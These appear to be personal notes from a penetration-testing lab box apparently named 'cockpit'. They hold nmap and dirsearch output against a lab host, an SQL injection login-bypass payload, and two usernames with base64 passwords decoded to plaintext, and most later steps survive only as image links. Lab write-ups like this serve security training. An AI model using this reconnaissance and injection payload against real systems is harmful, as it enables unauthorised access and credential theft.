```
┌──(kali㉿kali)-[~/PG/cockpit]
└─$ nmap -p- --min-rate 10000 192.168.134.10            
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 23:04 EST
Nmap scan report for 192.168.134.10
Host is up (0.056s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
9090/tcp open  zeus-admin

Nmap done: 1 IP address (1 host up) scanned in 9.69 seconds
                                                                                                                                                         
┌──(kali㉿kali)-[~/PG/cockpit]
└─$ nmap -p 22,80,9090 -sCV 192.168.134.10              
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-16 23:05 EST
Nmap scan report for 192.168.134.10
Host is up (0.039s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 98:4e:5d:e1:e6:97:29:6f:d9:e0:d4:82:a8:f6:4f:3f (RSA)
|   256 57:23:57:1f:fd:77:06:be:25:66:61:14:6d:ae:5e:98 (ECDSA)
|_  256 c7:9b:aa:d5:a6:33:35:91:34:1e:ef:cf:61:a8:30:1c (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: blaze
|_http-server-header: Apache/2.4.41 (Ubuntu)
9090/tcp open  http    Cockpit web service 198 - 220
|_http-title: Did not follow redirect to https://192.168.134.10:9090/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 37.58 seconds
```

```
┌──(kali㉿kali)-[~/PG/cockpit]
└─$ dirsearch -u http://192.168.134.10/ 
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PG/cockpit/reports/http_192.168.134.10/__25-02-16_23-07-02.txt

Target: http://192.168.134.10/

[23:07:02] Starting: 
[23:07:08] 301 -  313B  - /js  ->  http://192.168.134.10/js/                
[23:07:08] 403 -  279B  - /.ht_wsr.txt                                      
[23:07:08] 403 -  279B  - /.htaccess.bak1                                   
[23:07:08] 403 -  279B  - /.htaccess.save                                   
[23:07:08] 403 -  279B  - /.htaccess.orig
[23:07:08] 403 -  279B  - /.htaccess_sc
[23:07:08] 403 -  279B  - /.htaccess_extra
[23:07:08] 403 -  279B  - /.htaccess.sample                                 
[23:07:08] 403 -  279B  - /.htaccess_orig
[23:07:08] 403 -  279B  - /.htaccessBAK
[23:07:09] 403 -  279B  - /.htaccessOLD
[23:07:09] 403 -  279B  - /.htaccessOLD2
[23:07:09] 403 -  279B  - /.htm                                             
[23:07:09] 403 -  279B  - /.html
[23:07:09] 403 -  279B  - /.htpasswd_test                                   
[23:07:09] 403 -  279B  - /.htpasswds                                       
[23:07:09] 403 -  279B  - /.httr-oauth                                      
[23:07:12] 403 -  279B  - /.php                                             
[23:08:09] 301 -  314B  - /css  ->  http://192.168.134.10/css/              
[23:08:28] 301 -  314B  - /img  ->  http://192.168.134.10/img/              
[23:08:35] 200 -  456B  - /js/                                              
[23:08:36] 200 -  379B  - /login.php                                        
[23:08:37] 302 -    0B  - /logout.php  ->  login.php                        
[23:09:11] 403 -  279B  - /server-status                                           [23:09:11] 403 -  279B  - /server-status/
                                                                             
Task Completed

┌──(kali㉿kali)-[~/PG/cockpit]
└─$ dirsearch -u http://192.168.134.10:9090/ -x 400-500
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460

Output File: /home/kali/PG/cockpit/reports/http_192.168.134.10_9090/__25-02-16_23-13-17.txt

Target: http://192.168.134.10:9090/

[23:13:17] Starting: 
[23:14:41] 200 -    9KB - /favicon.ico                                      
[23:15:33] 200 -   24B  - /ping                                             
                                                                             
Task Completed
```

![Pasted image 20250217120837](<0. Attachments/Pasted image 20250217120837.png>)

![Pasted image 20250217121007](<0. Attachments/Pasted image 20250217121007.png>)

![Pasted image 20250217120859](<0. Attachments/Pasted image 20250217120859.png>)

SQL Injection
![Pasted image 20250217121134](<0. Attachments/Pasted image 20250217121134.png>)

using
```
'OR '' = '
```
![Pasted image 20250217133823](<0. Attachments/Pasted image 20250217133823.png>)

![Pasted image 20250217133744](<0. Attachments/Pasted image 20250217133744.png>)

```
james - Y2FudHRvdWNoaGh0aGlzc0A0NTUxNTI= --> canttouchhhthiss@455152
cameron - dGhpc3NjYW50dGJldG91Y2hlZGRANDU1MTUy --> thisscanttbetouchedd@455152
```
![Pasted image 20250217134304](<0. Attachments/Pasted image 20250217134304.png>)

![Pasted image 20250217134345](<0. Attachments/Pasted image 20250217134345.png>)

![Pasted image 20250217134501](<0. Attachments/Pasted image 20250217134501.png>)

![Pasted image 20250217135114](<0. Attachments/Pasted image 20250217135114.png>)

![Pasted image 20250217135439](<0. Attachments/Pasted image 20250217135439.png>)

![Pasted image 20250217140147](<0. Attachments/Pasted image 20250217140147.png>)

![Pasted image 20250217140202](<0. Attachments/Pasted image 20250217140202.png>)

![Pasted image 20250217140429](<0. Attachments/Pasted image 20250217140429.png>)

